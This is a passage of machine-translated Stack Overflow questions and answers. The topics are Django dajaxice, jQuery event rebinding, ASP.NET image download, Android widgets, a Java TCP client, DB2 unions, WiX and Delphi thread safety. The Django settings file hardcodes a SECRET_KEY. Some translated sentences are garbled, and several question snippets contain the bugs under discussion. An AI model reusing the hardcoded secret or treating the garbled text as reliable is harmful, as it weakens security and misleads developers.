我一直在尝试使用 dajaxice 创建一个最简单的应用程序。我在这里阅读了有关此问题的所有主题，不仅在这里，多次重写所有代码，但仍然看不到问题所在。最有趣的是，这些示例（几乎全部）都有效： [https](https://github.com/jorgebastida/django-dajaxice/downloads) ://github.com/jorgebastida/django-dajaxice/downloads dajaxice-examples.tar.gz

但在我的项目中，我有这个：

```
Uncaught TypeError: Cannot call method 'sayhello' of undefined 
```

我的工具：

*   视窗 7 64
*   python-2.7.3
*   Django-1.4.2
*   django-dajaxice-0.2

项目结构：

```
BlocalProject/
    templates/
        template_1.html
    manage.py
    BlocalProject/
        ajapp/
            __init__.py
            ajview.py
        __init__.py
        settings.py
        urls.py
        views.py
        wsgi.py 
```

网址.py：

```
from django.conf.urls.defaults import *
import settings
from dajaxice.core import dajaxice_autodiscover
dajaxice_autodiscover()

urlpatterns = patterns('',
    (r'^%s/' % (settings.DAJAXICE_MEDIA_PREFIX), include('dajaxice.urls')),
    (r'^$', 'BlocalProject.views.start_page'),
) 
```

视图.py：

```
from django.shortcuts import render

def start_page(request):
    return render(request,'template_1.html') 
```

ajapp.py：

```
from django.utils import simplejson
from dajaxice.core import dajaxice_functions

def sayhello(request):
    return simplejson.dumps({'message': 'Trololo!'})

dajaxice_functions.register(sayhello) 
```

模板_1.html：

```
{% load dajaxice_templatetags %}
<html>
  {% dajaxice_js_import %}
  <script>
    function alertMessage(data){
      alert(data.message);
      return false;
    }
  </script>

  <body>
    Some text
    <input type="button" value="Get!" onclick="Dajaxice.ajapp.sayhello(alertMessage);" />
  </body>
</html> 
```

设置.py：

```
# Django settings for BlocalProject project.

DEBUG = True
TEMPLATE_DEBUG = DEBUG

ADMINS = (
    # ('Your Name', 'your_email@example.com'),
)

MANAGERS = ADMINS

DATABASE_ENGINE = ''           # 'postgresql_psycopg2', 'postgresql', 'mysql', 'sqlite3' or 'oracle'.
DATABASE_NAME = ''             # Or path to database file if using sqlite3.
DATABASE_USER = ''             # Not used with sqlite3.
DATABASE_PASSWORD = ''         # Not used with sqlite3.
DATABASE_HOST = ''             # Set to empty string for localhost. Not used with sqlite3.
DATABASE_PORT = ''             # Set to empty string for default. Not used with sqlite3.

# Local time zone for this installation. Choices can be found here:
# http://en.wikipedia.org/wiki/List_of_tz_zones_by_name
# although not all choices may be available on all operating systems.
# In a Windows environment this must be set to your system time zone.

TIME_ZONE = 'America/Chicago'

# Language code for this installation. All choices can be found here:
# http://www.i18nguy.com/unicode/language-identifiers.html
LANGUAGE_CODE = 'en-us'

SITE_ID = 1

# If you set this to False, Django will make some optimizations so as not
# to load the internationalization machinery.
USE_I18N = True

# Absolute filesystem path to the directory that will hold user-uploaded files.
# Example: "/home/media/media.lawrence.com/media/"
MEDIA_ROOT = ''

# URL that handles the media served from MEDIA_ROOT. Make sure to use a
# trailing slash.
# Examples: "http://media.lawrence.com/media/", "http://example.com/media/"
MEDIA_URL = ''

# URL prefix for admin media -- CSS, JavaScript and images. Make sure to use a
# trailing slash.
# Examples: "http://foo.com/media/", "/media/".
ADMIN_MEDIA_PREFIX = '/media/'

# URL prefix for static files.
# Example: "http://media.lawrence.com/static/"
STATIC_URL = '/'

# Make this unique, and don't share it with anybody.
SECRET_KEY = ')er9!%4v0=nmxd#2=j1*tlktmidq8aam2y)-%fjf6%^xp*5r)c'

# List of callables that know how to import templates from various sources.
TEMPLATE_LOADERS = (
    'django.template.loaders.filesystem.Loader',
    'django.template.loaders.app_directories.Loader',
    #'django.template.loaders.eggs.load_template_source',
)

MIDDLEWARE_CLASSES = (
    'django.middleware.common.CommonMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
)

ROOT_URLCONF = 'BlocalProject.urls'

# Python dotted path to the WSGI application used by Django's runserver.
#WSGI_APPLICATION = 'BlocalProject.wsgi.application'

TEMPLATE_DIRS = (
    'D:/_/Site_test/Djpr/BlocalProject/templates',
    # Put strings here, like "/home/html/django_templates" or "C:/www/django/templates".
    # Always use forward slashes, even on Windows.
    # Don't forget to use absolute paths, not relative paths.
)

TEMPLATE_CONTEXT_PROCESSORS = ("django.contrib.auth.context_processors.auth",
                               "django.core.context_processors.debug",
                               "django.core.context_processors.i18n",
                               "django.core.context_processors.media",
                               "django.core.context_processors.static",
                               "django.core.context_processors.request",
                               "django.contrib.messages.context_processors.messages",)

INSTALLED_APPS = (
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.sites',
    'dajaxice',
    'BlocalProject.ajapp',  
)

DAJAXICE_MEDIA_PREFIX = "dajaxice"
DAJAXICE_DEBUG = True
DAJAXICE_JS_DOCSTRINGS = True
#DAJAXICE_NOTIFY_EXCEPTIONS = True

import logging
logging.basicConfig(level=logging.DEBUG) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-12T10:09:17.007

这可能为时已晚，但...

恕我直言，`dajaxice_autodiscover()`实际上并没有得到你的方法。我记得另一个 ajax lib 也有类似的问题，我通过在`models.py`(or `views.py`) 中添加一个导入解决了这个问题，它在应用程序启动时被导入。您提到的[示例在 simple/views.py 中有一个导入：](https://github.com/jorgebastida/django-dajaxice/tree/master/examples)

```
# Create your views here.
from django.shortcuts import render

# THIS ONE!
from dajaxice.core import dajaxice_functions
# ---------

def index(request):

    return render(request, 'simple/index.html') 
```

看起来它正在初始化东西。我的方法是：

*   把几个打印语句放在你的里面`ajapp.py`，看看它们是否被打印出来。
*   创建空`models.py`并`views.py`在您的`BlocalProject.ajapp`（django 是否仍用于`models.py`将模块验证为 django 应用程序？）

如果您的打印语句没有被触发，那么您需要找出原因。正如我所提到的，它可能就像在模型中导入 ajax 模块一样简单 :)

# php - 切换内容时的jQuery .load问题

> ID：13572827
> 
> 赞同：1
> 
> 时间：2012-11-26T20:43:11.773
> 
> 标签：php, javascript, jquery, html, ajax

[Tristann.tk](http://tristann.tk/) 在这个网站上点击关于我，然后点击回到首页，然后尝试切换底部的页面，它没有改变。为什么？

jQuery代码：

```
$(document).ready(function(){
    $(".page_links .page li").click(function(){
        $(".page_links .page li").css({'background-color' : ''});
        $(this).css({'background-color' : '#A5CDFA'});
        $(".posts").load("/includes/data.php?data=pages&page=" + this.className);
    });
    $(".navlist #about_me").click(function(){
        $(".navlist #home").css({'text-decoration' : 'none'});
        $(".navlist #about_me").css({'text-decoration' : 'underline'});
        $(".vsebina").load("/includes/data.php?data=about_me");
    });
    $(".navlist #home").click(function(){
        $(".navlist #about_me").css({'text-decoration' : 'none'});
        $(".navlist #home").css({'text-decoration' : 'underline'});
        $(".vsebina").load("/includes/data.php?data=home");
    });
    $(".navlist #home").css({'text-decoration' : 'underline'});
    $(".1").css({'background-color' : '#A5CDFA'});
}); 
```

div是这样的：

```
<div class="zunanji">
    <div class="glava">
        <div class="meni">
            <ul class="navlist">
                <li><a id="home" href="javascript:void(0)">Home</a></li>
                <li><a id="about_me" href="javascript:void(0)">About Me</a></li>
            </ul>
        </div>
    </div>
    <div class="container">
        <div class="vsebina">
        <? get_posts();
           get_pages();
        ?>
        </div>
        <div class="stranska">
            <h2>Archive</h2>
        </div>
    </div>
</div> 
```

2 个 PHP 函数在开头返回 5 个帖子，在底部返回页码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:46:52.090

`load`由于`page_link`s 正在被替换，因此您需要在之后重新绑定这些事件。一种更简单、更简洁的方法是使用事件委托。最好的方法是使用[`$.fn.on`](http://api.jquery.com/on/)，它的性能更好，而且比`$.fn.live`. 此外，由于`load`将替换你必须在回调`page_links`中做这些事情：`background-color`

```
$(".vsebina").on('click', '.page_links .page li', function(){
    var $page = $(this); // save the page link that was clicked
    var path = "/includes/data.php?data=pages&page=" + this.className;

    $(".posts").load(path, function(){
        $(".page_links .page li").css({'background-color' : ''});
        $page.css({'background-color' : '#A5CDFA'});            
    });
}); 
```

这会将单击事件绑定到`.vsebina`容器并检查单击的项目是否是页面链接。如果是，它将触发您的处理程序。这样，即使内容被替换，您的处理程序也会运行。

[在此处阅读有关`$.fn.on`vs `$.fn.live`vs `$.fn.delegate`vs的更多信息`$.fn.bind`](http://www.elijahmanor.com/2012/02/differences-between-jquery-bind-vs-live.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:49:08.323

当您加载新内容时，您的点击事件会断开连接。更改页面导航代码以使用[live()](http://api.jquery.com/live/)方法：

```
 $(".page_links .page li").live('click',function(){
        $(".page_links .page li").css({'background-color' : ''});
        $(this).css({'background-color' : '#A5CDFA'});
        $(".posts").load("/includes/data.php?data=pages&page=" + this.className);
  }); 
```

# c# - 在 ASP.NET C# 页面上从 SQL Server 下载图像

> ID：13572832
> 
> 赞同：0
> 
> 时间：2012-11-26T20:43:21.547
> 
> 标签：c#, asp.net, asp.net-ajax

我有一个文件上传控件，可以将图像上传到 SQL Server 2008 数据库，我想通过弹出保存对话框下载它。下载文件的代码执行良好，但当我单击下载链接按钮时没有任何反应。该事件从后面的代码触发。我唯一的猜测是再次导致问题的模态弹出窗口。

```
<Modalpopup>
</ModalPopup>
<UpdatePanel>
   --DetailsView
    --------LinkButton(Download)
   --DetailsView
</UpdatePanel> 
```

是页面的结构。

```
<!-- Details View here -->
            <asp:DetailsView ID="dvReviewCases" runat="server" Height="50px" 
                AutoGenerateRows="False" CssClass="dvCSS" 
                OnDataBound="dvADReviewCases_DataBound" 
                onpageindexchanging="dvReviewCases_PageIndexChanging" onitemcommand="dvReviewCases_ItemCommand"
                 >
                <Fields>

                    <asp:TemplateField HeaderStyle-CssClass="dvHeaderStyle" HeaderText="Evidence" ItemStyle-CssClass="dvValueField" > 
                        <ItemTemplate>
                            <asp:LinkButton ID="btnDownload" runat="server" Text='<%#Eval("evidenceID") %>' CommandName="Download" >
                            </asp:LinkButton>
                        </ItemTemplate>    
                    </asp:TemplateField>

                </Fields>
            </asp:DetailsView> 
```

代码背后

```
 // Download file from Evidence table
    protected void dvReviewCases_ItemCommand(object sender, DetailsViewCommandEventArgs e)
    {
        if (e.CommandName == "Download")
        {
            String strCaseID = Session["caseID"].ToString();
            String strEvidenceID = Session["evidenceID"].ToString();

            //Search for evidence file
            DbCommand cmd = GetData.CreateCommand("ADGetEvidence");
            GetData.AddParameter(cmd, strEvidenceID, "@evidenceID");
            GetData.AddParameter(cmd, strCaseID, "@caseID");
            GetData.GetResults(cmd);

            // Check if datatable has row returned
            if (GetData.getTable().Rows.Count > 0)
            {
                String fileName = "Evidence" + Session["caseID"].ToString();
                byte[] file = null;
                String fileType = GetData.getTable().Rows[0][1].ToString();

                // Typecast resulting row to byte
                file = ((byte[])GetData.getTable().Rows[0][0]);
                Response.ContentType = fileType;

                // Give user option to download file
                Response.AddHeader("Content-Disposition","attachment;filename=" + fileName);
                Response.BinaryWrite(file);

                Response.End();

            }

        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-27T04:44:14.210

为什么不尝试使用查询字符串。这是我使用查询字符串的代码，我从数据库中获取图像，而无需在本地文件夹中创建所需图像的任何实例。跳这有帮助。

```
<%@ WebHandler Language="C#" Class="DisplayImg" %>

using System;
using System.Web;
using System.Configuration;
using System.IO;
using System.Data;
using System.Data.SqlClient;

public class DisplayImg : IHttpHandler
{

    public void ProcessRequest(HttpContext context)
    {
        string theID;
        if (context.Request.QueryString["id"] != null)
            theID = context.Request.QueryString["id"].ToString();
        else
            throw new ArgumentException("No parameter specified");

        context.Response.ContentType = "image/jpeg";
        Stream strm = DisplayImage(theID);
        byte[] buffer = new byte[2048];
        int byteSeq = strm.Read(buffer, 0, 2048);

        while (byteSeq > 0)
        {
            context.Response.OutputStream.Write(buffer, 0, byteSeq);
            byteSeq = strm.Read(buffer, 0, 2048);
        }
    }

    public Stream DisplayImage(string theID)
    {
        SqlConnection connection = new SqlConnection(ConfigurationManager.ConnectionStrings["SERVER"].ConnectionString.ToString());
        string sql = "SELECT Server_image_icon FROM tbl_ServerMaster WHERE server_Code = @ID";
        SqlCommand cmd = new SqlCommand(sql, connection);
        cmd.CommandType = CommandType.Text;
        cmd.Parameters.AddWithValue("@ID", theID);
        connection.Open();
        object theImg = cmd.ExecuteScalar();
        try
        {
            return new MemoryStream((byte[])theImg);
        }
        catch
        {
            return null;
        }
        finally
        {
            connection.Close();
        }
    }

    public bool IsReusable
    {
        get
        {
            return false;
        }
    }
} 
```

只需在 CS 代码中添加一行

```
UploadImg.ImageUrl = "~/DisplayImg.ashx?id=" + code; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T21:00:24.600

UpdatePanel 内部的 PostBack 只能响应整个页面，因为 MSAjax 魔术将旧页面（在浏览器中）和 PostBack 生成的差异合并以呈现新版本。

将 LinkBut​​ton 转换为具有所有必需参数的 HyperLink 并实现 HttpHandler 以提供二进制数据。

# android - 用于绑定集合的 Android 小部件服务类未被提供者调用

> ID：13572833
> 
> 赞同：1
> 
> 时间：2012-11-26T20:43:22.257
> 
> 标签：android, android-widget, appwidgetprovider

请多多包涵，因为我是 Android 开发新手。

我正在构建一个小部件，它在放置在主屏幕上时会打开一个配置活动。当我完成配置并按下“完成”时，小部件提供程序 (onUpdate) 应该调用小部件服务类以将可绘制列表绑定到网格视图。但是，服务类没有被调用，gridview 是空的。对此的任何帮助表示赞赏，代码如下：

*注意：我有一个 main.xml，其中包含 gridview，另一个 xml 包含模板（imageView 和 textView）gridview 单元格。

**显现：**

```
<service android:name=".WidgetService" android:permission="android.permission.BIND_REMOTEVIEWS" android:exported="false" />

<receiver android:name=".WidgetProvider" android:label="@string/app_name">
  <intent-filter>
    <action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
  </intent-filter>
  <meta-data android:name="android.appwidget.provider" android:resource="@xml/button_widget_provider" />
</receiver> 
```

**提供者：**

```
public class WidgetProvider extends AppWidgetProvider {

public void onUpdate(Context context, AppWidgetManager appWidgetManager, int[] appWidgetIds) {

 for (int i=0; i < appWidgetIds.length; i++){

   Intent intent = new Intent(context, WidgetService.class);
   intent.putExtra(AppWidgetManager.EXTRA_APPWIDGET_ID, appWidgetIds[i]);
   intent.setData(Uri.parse(intent.toUri(Intent.URI_INTENT_SCHEME)));

   RemoteViews remoteViews = new RemoteViews(context.getPackageName(), R.layout.main);
   remoteViews.setRemoteAdapter(appWidgetIds[i], R.id.gridview, intent);

   appWidgetManager.updateAppWidget(appWidgetIds[i], remoteViews);
 }       

   super.onUpdate(context, appWidgetManager, appWidgetIds);
 }
......(omitted code)} 
```

**服务：**

```
public class WidgetService extends RemoteViewsService {

    @Override
    public RemoteViewsFactory onGetViewFactory(Intent intent){
            return new VZRemoteViewsFactory(this.getApplicationContext(), intent);
        }
    }

    class VZRemoteViewsFactory implements RemoteViewsService.RemoteViewsFactory{

       public VZRemoteViewsFactory(Context context, Intent intent){
            thisContext = context;
            appWidgetId = intent.getIntExtra(AppWidgetManager.EXTRA_APPWIDGET_ID, AppWidgetManager.INVALID_APPWIDGET_ID);
       }

       public void onCreate(){
            // code to add drawables to list here
       }

       public RemoteViews getViewAt(int position){
            RemoteViews remoteView = new RemoteViews(thisContext.getPackageName(), R.layout.vzwidget_item);

            //  setting the image view resource this way for now just for testing
            remoteView.setImageViewResource(R.id.launcher_icon, R.drawable.vzicon);
            remoteView.setTextViewText(R.id.textview, "test");

            return remoteView;
       }
.....(omitted code)} 
```

谢谢你！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T21:15:09.980

根据我的经验（并查看我自己刚刚编写的小部件） - OnUpdate 在配置活动启动时被调用，并且在您发布此活动的结果后，appWidgetProvider 会执行以下意图操作 - android.appwidget.action .APPWIDGET_UPDATE_OPTIONS（在果冻豆上测试）。

这可能不是处理这个问题的最合适的方法，但这就是我处理这个问题的方式——当配置活动发布结果时——我启动我的远程视图服务并开始使用正确的 widgetid 发送视图。

# java - TCP/IP 连接并发送但在初始发送后不起作用

> ID：13572839
> 
> 赞同：1
> 
> 时间：2012-11-26T20:43:58.723
> 
> 标签：java, android, tcp, tcpclient, tcp-ip

帮助！我要疯了！我正在为服务器使用 Visual Basic 6.0 Winsock。我能够保持活动连接，甚至从我的 Android 应用程序接收到 VB 应用程序 "VER:Android,LAT:28.111921,LNG:-81.950433,ID:1038263,SND:0,VDO:0"> 我解析数据并将其放入其字段中。

初次连接后，我尝试从 VB 向服务器发送一条简单消息，但我从未收到它。每当我关闭我的 VB.NET 应用程序时，我会注意到我在 LogCat 中收到这个：

11-26 15:38:16.567: I/TcpClient(986): 收到: null

我是 Android 新手，任何帮助将不胜感激。我需要帮助尝试通过我的客户端（Android）和服务器（VB）来回接收和发送消息

```
 package com.WheresMySon;

 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.IOException;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.net.Socket;
 import java.net.UnknownHostException;
 import android.app.Activity;
 import android.content.Intent;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.util.Log;
 import android.view.View.OnClickListener;
 import android.widget.TextView;

 public class TcpClient extends Activity {
/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
    new TcpClientTask().execute();

}

class TcpClientTask extends AsyncTask<Void, Void, Void> {
    private static final int TCP_SERVER_PORT = 1234;
    private boolean error = false;
    Boolean SocketStarted = false;

    protected Void doInBackground(Void... arg0) {
        try {
            Socket s = new Socket("10.0.2.2", TCP_SERVER_PORT);

                BufferedReader in = new BufferedReader(new InputStreamReader(s.getInputStream()));
                BufferedWriter out = new BufferedWriter(new OutputStreamWriter(s.getOutputStream()));

            //send output msg
            String outMsg = "VER:Android,LAT:28.111921,LNG:-81.950433,ID:1038263,SND:0,VDO:0";
            out.write(outMsg);
            out.flush();

            Log.i("TcpClient", "sent: " + outMsg);

            //accept server response

            String inMsg = in.readLine() + System.getProperty("line.separator");

            Log.i("TcpClient", "received: " + inMsg);

            //close connection
        } catch (UnknownHostException e) {
            error = true;
            e.printStackTrace();
        } catch (IOException e) {
            error = true;
            e.printStackTrace();
        } 

        return null;
    }

    protected void onPostExecute() {
        if(error) {
            // Something bad happened

        }
        else {
            // Success

        }

    }
}

//replace runTcpClient() at onCreate with this method if you want to run tcp client as a service
private void runTcpClientAsService() {
    Intent lIntent = new Intent(this.getApplicationContext(), TcpClientService.class);
    this.startService(lIntent);
}

 } 
```

# sql - DB2 Union 导致超时？

> ID：13572840
> 
> 赞同：3
> 
> 时间：2012-11-26T20:44:01.220
> 
> 标签：sql, performance, timeout, db2

第一次使用 DB2。我有一个执行联合的存储过程，无论如何它都会尝试。程序超时。联合两侧的 select 语句在单独执行时快速执行，没有问题。工会为什么要这样做？

这是 proc 的一些 sudo 代码，假设数据类型是 int 或 string，并且它们在比较或联合时匹配，除非 SQL 中另有说明：

```
DECLARE Foo CURSOR WITH RETURN FOR
  Select STRIP(A.Name) as my_Name, 
     Case A.Number
        when 2 then '(' || strip(char(A.Number)) || ')' strip(B.num)
        when 3 then '(' || strip(char(A.Number)) || ')' strip(C.num)
        when 4 then '(' || strip(char(A.Number)) || ')' strip(D.num)
        when 5 then '(' || strip(char(A.Number)) || ')' strip(E.num)
        when 6 then '(' || strip(char(A.Number)) || ')' strip(F.num)
        end as my_number
  FROM A
       left outer join B on A.Number= 2 and A.Name = B.Name
       left outer join C on A.Number= 3 and C.Name = B.Name
       left outer join D on A.Number= 4 and D.Name = B.Name
       left outer join E on A.Number= 5 and E.Name = B.Name
       left outer join F on A.Number= 6 and F.Name = B.Name 
      ,session.Temp_Result X
  WHERE X.ID = A.ID
  GROUP BY A.Number, A.Name, B.Name, C.Name, D.Name, E.Name, F.Name
for fetch only ur;

DROP TABLE Session.Temp_Result;

DECLARE GLOBAL TEMPORARY TABLE session.Temp_Result
(     ID DECIMAL(18,0)
);

INSERT INTO session.Temp_Result
        select X.ID
        from Z, Y, X, Q
        where Z.num = 6
          and Z.ID = Y.ID2
          and Y.GROUPA = 'ABC'
          and Y.GROUPB = 'DEF'
          and Y.ID = X.ID2
          and X.ID = Q.ID            
        union
       select W.ID
        from Z, Y, W
        where Z.num = 6
          and Z.ID = Y.ID2
          and Y.GROUPA = 'ABC'
          and Y.GROUPB = 'DEF'
          and Y.ID = W.ID2
        group by ID;

  OPEN C_HIERARCHIES; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-02T08:45:17.583

尝试使用“with”语句进行查询。

```
DECLARE GLOBAL TEMPORARY TABLE session.Temp_Result (
ID DECIMAL(18,0))
WITH REPLACE;

INSERT INTO session.Temp_Result
(ID)
WITH Q1(Y_ID)
AS (
SELECT Y.ID
FROM Z
    INNER JOIN Y ON Z.ID = Y.ID2
WHERE Z.NUM = 6 AND Y.GROUPA = 'ABC' AND Y.GROUPB = 'DEF')

SELECT X.ID
FROM X
    INNER JOIN Q1 ON X.ID2 = Q1.Y_ID
WHERE EXISTS(SELECT 1 FROM Q WHERE Q.ID = X.ID)
UNION
SELECT DISTINCT W.ID
FROM W
    INNER JOIN Q1 ON W.ID2 = Q1.Y_ID 
```

如果没有帮助，请尝试对 select 语句使用“解释 SQL”。也许你应该创建一些索引......

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-06T22:39:37.583

我的猜测是原始代码缺少伪代码中存在的连接条件。您应该使用正确的连接语法重写查询以验证查询。

在任何情况下，如果每个子查询运行得很快并且联合存在一些不正常的后果，您可以尝试将其拆分为两个插入：

```
INSERT INTO session.Temp_Result
    select X.ID
    from Z, Y, X, Q
    where Z.num = 6
      and Z.ID = Y.ID2
      and Y.GROUPA = 'ABC'
      and Y.GROUPB = 'DEF'
      and Y.ID = X.ID2
      and X.ID = Q.ID;

INSERT INTO session.Temp_Result
   select W.ID
    from Z, Y, W
    where Z.num = 6
      and Z.ID = Y.ID2
      and Y.GROUPA = 'ABC'
      and Y.GROUPB = 'DEF'
      and Y.ID = W.ID2
    group by ID; 
```

然后您可以查询 Temp_Result 为：

```
select distinct id from TempResult 
```

删除重复项似乎没有必要，因为数据非常小，但您也可以直接这样做。

# wix - 卸载后如何离开虚拟目录

> ID：13572841
> 
> 赞同：1
> 
> 时间：2012-11-26T20:44:04.277
> 
> 标签：wix

我在 IIS 中创建了一个网站。我想在它下面创建一个虚拟目录，然后在它下面创建另一个。当我卸载时，如果第一个虚拟目录中有东西，我只想卸载最后一个虚拟目录。（我不在乎是否没有 - 可以卸载或可以离开它。）

```
-Website
|-VirtualDirectory1
||-VirtualDirectory2 
```

这是我当前的组件：

```
version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi" xmlns:iis="http://schemas.microsoft.com/wix/IIsExtension">
  <!-- Setup IIS. -->
  <Fragment>
    <!-- Since these are outside of a component, they're not being created, just referenced.
         http://www.wintellect.com/cs/blogs/jrobbins/archive/2011/01/25/install-a-new-virtual-directory-to-default-web-site-with-wix.aspx -->
    <iis:WebSite Id="Services" Description="Services">
      <iis:WebAddress Id="ServicesBindings" Header="[Hostname]" Port="80" />
    </iis:WebSite>
    <iis:WebAppPool Id="ToolkitServicesAppPool" Name="Toolkit Services" />

    <ComponentGroup Id="IISComponents" Directory="InstallDirectory">
      <Component Id="Toolkit.Services.App" Guid="PUT-GUID-HERE" KeyPath="yes">
        <iis:WebVirtualDir Id="ToolkitDir" Alias="Toolkit" Directory="Toolkit" WebSite="Services">
          <iis:WebVirtualDir Id="AppDir" Alias="App" Directory="InstallDirectory">
            <iis:WebApplication Id="AppApp" Name="App" WebAppPool="ToolkitServicesAppPool" />
          </iis:WebVirtualDir>
        </iis:WebVirtualDir>
      </Component>
    </ComponentGroup>
  </Fragment>
</Wix> 
```

您不能将 WebVirtualDir 放在 WebSite 下，因为它们不允许在组件之外，所以我不能手动创建 VirtualDirectory1 并使用它。我也尝试使用WebDir（随机）定义VirtualDirectory1，但是不能在WebDir下定义WebVirtualDir。没有办法引用一个虚拟目录，所以我不能把它放到一个永久组件中，而只是从另一个组件中引用它。

这基本上已经被[问过，](https://stackoverflow.com/questions/13077205/wix-how-to-skip-removing-of-iiswebvirtualdir-if-virtual-directory-contains-nes)但没有答案。任何想法，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-17T08:44:29.010

你可以这样做：

1.  创建一个包含根 vdir 的永久组件。或者您可以在多个产品之间共享该组件，这样在所有产品都没有卸载的情况下，root vdir 不会被删除。
2.  使用别名“root_vdir_name/new_vdir_name”创建另一个组件。

    ```
    <Component Id="Toolkit.Services.App" Guid="PUT-GUID-HERE" KeyPath="yes" Permanent="yes">
      <iis:WebVirtualDir Id="ToolkitDir" Alias="Toolkit" Directory="Toolkit" WebSite="Services" />
    </Component>

    <Component Id="Toolkit.Services.App" Guid="PUT-GUID-HERE" KeyPath="yes">
      <iis:WebVirtualDir Id="AppDir" Alias="Toolki/App" Directory="InstallDirectory" WebSite="Services">
        <iis:WebApplication Id="AppApp" Name="App" WebAppPool="ToolkitServicesAppPool" />
      </iis:WebVirtualDir>
    </Component> 
    ```

# jquery - 如何在jquery datetimepicker的日历上设置日期（突出显示的当天）？

> ID：13572851
> 
> 赞同：0
> 
> 时间：2012-11-26T20:44:29.690
> 
> 标签：jquery, jquery-ui-datepicker, datetimepicker, timepicker

我在[这里](http://trentrichardson.com/examples/timepicker/)使用 Trent Richardson 的 datetimepicker 。如何在日历上设置日期？以下正确设置了时间，但未设置突出显示为当前日期的日期。在这个特定的示例中，我正在劫持“现在”按钮单击以设置当前的 UTC 日期/时间。

```
$.datepicker._gotoToday = function (id) {
var inst = this._getInst($(id)[0]),
$dp = inst.dpDiv;
this._base_gotoToday(id);
var tp_inst = this._get(inst, 'timepicker');
var now = new Date();
var now_utc = new Date(now.getUTCFullYear(), now.getUTCMonth(), now.getUTCDate(), now.getUTCHours(), now.getUTCMinutes(), now.getUTCSeconds());
//
// Time gets set correctly but the date highlight for current day is not getting set in the calendar picker.
this._setTime(inst, now_utc);
$('.ui-datepicker-today', $dp).click(); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T20:55:53.827

由于 Trent Richardson 的 datetimepicker 依赖于 jQueryUI，我认为它的方法和设置是相关的。所以，

也许是这样的：

```
$( ".selector" ).datepicker( "setDate", "10/12/2012" ); 
```

或者

```
$.datepicker.setDefaults({
    defaultDate: 1, 
```

这可能不是你要找的，只是头脑风暴。

参考资料： [jUI defaultDate](http://api.jqueryui.com/datepicker/#option-defaultDate) [setDate](http://api.jqueryui.com/datepicker/#method-setDate)

# multithreading - 线程保护对象列表

> ID：13572852
> 
> 赞同：1
> 
> 时间：2012-11-26T20:44:30.570
> 
> 标签：multithreading, delphi, thread-safety, delphi-xe2

我一直在使用一些多线程应用程序，其中一部分需要线程保护对象。我使用以下方法对单个对象线程进行了保护：

```
type
  TMyClass = class(TObject)
  private
    FLock: TRTLCriticalSection;
    FSomeString: String;
    procedure Lock;
    procedure Unlock;
    function GetSomeString: String;
    procedure SetSomeString(Value: String);
  public
    constructor Create;
    destructor Destroy; override;
    property SomeString: String read GetSomeString write SetSomeString;
  end;

implementation

constructor TMyClass.Create;
begin
  InitializeCriticalSection(FLock);
  Lock;
  try
    //Initialize some stuff
  finally
    Unlock;
  end;
end;

destructor TMyClass.Destroy;
begin
  Lock;
  try
    //Finalize some stuff
  finally
    Unlock;
  end;
  DeleteCriticalSection(FLock);
  inherited Destroy;
end;

procedure TMyClass.Lock;
begin
  EnterCriticalSection(FLock);
end;

procedure TMyClass.Unlock;
begin
  LeaveCriticalSection(FLock);
end;

function TMyClass.GetSomeString: String;
begin
  Result:= '';
  Lock;
  try
    Result:= FSomeString;
  finally
    Unlock;
  end;
end;

procedure TMyClass.SetSomeString(Value: String);
begin
  Lock;
  try
    FSomeString:= Value;
  finally
    Unlock;
  end;
end; 
```

但是，当我实现一个对象列表时，我无法弄清楚如何安全地保护每个对象。我像这样创建我的对象列表：

```
type
  TMyClass = class;
  TMyClasses = class;

  TMyClass = class(TObject)
  private
    FOwner: TMyClasses;
  public
    constructor Create(AOwner: TMyClasses);
    destructor Destroy; override;
  end;

  TMyClasses = class(TObject)
  private
    FItems: TList;
    function GetMyItem(Index: Integer): TMyItem;
  public
    constructor Create;
    destructor Destroy; override;
    procedure Clear;
    function Count: Integer;
    property Items[Index: Integer]: TMyClass read GetMyItem; default;
  end;

implementation

{ TMyClass }

constructor TMyClass.Create(AOwner: TMyClasses);
begin
  FOwner:= AOwner;
  FOwner.FItems.Add(Self);
  //Initialize some stuff...
end;

destructor TMyClass.Destroy;
begin
  //Uninitialize some stuff...
  inherited Destroy;
end;

{ TMyClasses }

constructor TMyClasses.Create;
begin
  FItems:= TList.Create;
end;

destructor TMyClasses.Free;
begin
  Clear;
  FItems.Free;
  inherited Destroy;
end;

procedure TMyClasses.Clear;
begin
  while FItems.Count > 0 do begin
    TMyClass(FItems[0]).Free;
    FItems.Delete(0);
  end;
end;

function TMyClasses.Count: Integer;
begin
  Result:= FItems.Count;
end;

function TMyClasses.GetMyItem(Index: Integer): TMyClass;
begin
  Result:= TMyClass(FItems[Index]);
end; 
```

我认为有两种方法可以做到这一点，而这两种方法我都不信任。一种方法是在列表`TMyClasses`对象`FOwner.Lock;`（`FOwner.Unlock;`一次，并且会破坏多线程的目的。第二种方法是在每个单独的对象中放置另一个关键部分，但是太多也很危险，对吧？我怎样才能保护列表和其中的每个对象清单在一起？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T21:40:35.483

您实际上不能期望在列表类中使用与在序列化对单个对象的访问的简单类中使用的方法相同的方法。

